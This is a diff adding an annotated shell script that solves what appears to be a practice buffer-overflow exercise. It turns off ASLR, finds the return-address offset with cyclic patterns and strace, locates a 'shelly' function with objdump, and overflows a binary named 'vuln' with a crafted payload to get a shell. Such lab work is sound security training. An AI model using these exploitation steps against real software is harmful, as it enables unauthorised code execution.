@@ -1,0 +1,46 @@
+#!/bin/sh
+
+## turn off aslr (requires password)
+../../aslr.sh off
+
+## first test blind for overflow
+## I use the pwntools built in cyclic tool which generates de Bruijn sequences of x bytes
+## you can just as easily use python3 -c 'print("A"*100)' | ./vuln for additional control
+cyclic 100 | ./vuln    # none
+cyclic 150 | ./vuln    # segmentation fault
+cyclic 120 | ./vuln    # none
+cyclic 121 | ./vuln    # bus error (??)
+cyclic 122 | ./vuln    # segmentation fault
+
+## now try with strace to check the return address 
+cyclic 122 | strace ./vuln  # "--- SIGSEGV {si_signo=SIGSEGV, si_code=SEGV_MAPERR, si_addr=0x7ffff7006166} ---"
+cyclic 123 | strace ./vuln  # "--- SIGSEGV {si_signo=SIGSEGV, si_code=SEGV_MAPERR, si_addr=0x7fff00616166} ---"
+cyclic 124 | strace ./vuln  # "--- SIGSEGV {si_signo=SIGSEGV, si_code=SEGV_MAPERR, si_addr=0x7f0062616166} ---"
+cyclic 125 | strace ./vuln  # "--- SIGSEGV {si_signo=SIGSEGV, si_code=SEGV_MAPERR, si_addr=0x6762616166} ---"
+cyclic 126 | strace ./vuln  # "--- SIGSEGV {si_signo=SIGSEGV, si_code=SEGV_MAPERR, si_addr=0x616762616166} ---"
+cyclic 127 | strace ./vuln  # "--- SIGSEGV {si_signo=SIGSEGV, si_code=SI_KERNEL, si_addr=NULL} ---"
+
+## 127 seems to overide the return address completely
+## I know I want to jump to a function called shelly
+## try find the function address with objdump
+objdump -d vuln | grep shelly  # "0000000000401166 <shelly>:"
+
+## lets try overwrite the return with this address (won't work with python3)
+python2 -c 'print("A"*120 + "\x40\x11\x66\x00\x00\x00\x00\x00")' | ./vuln  # segmentation fault
+python2 -c 'print("A"*121 + "\x40\x11\x66\x00\x00\x00\x00\x00")' | ./vuln  # segmentation fault
+
+## we can use a radare profile fill to set stdin and debug
+python2 -c 'print("A"*120 + "\x40\x11\x66\x00\x00\x00\x00\x00")' > pattern
+echo "#\!/bin/rarun2
+stdin=./pattern" > profile.rr2
+# r2 -r profile.rr2 -d vuln 
+
+## I find out \x66 and \x44 are back to front and try again
+python2 -c 'print("A"*120 + "\x66\x11\x40\x00\x00\x00\x00\x00")' | ./vuln          # nothing 
+(python2 -c 'print("A"*120 + "\x66\x11\x40\x00\x00\x00\x00\x00")'; cat) | ./vuln   # this is a hack to keep stdin open, stalls
+# ls  
+# vuln pattern  profile.rr2  sol
+
+## solved!
+
+
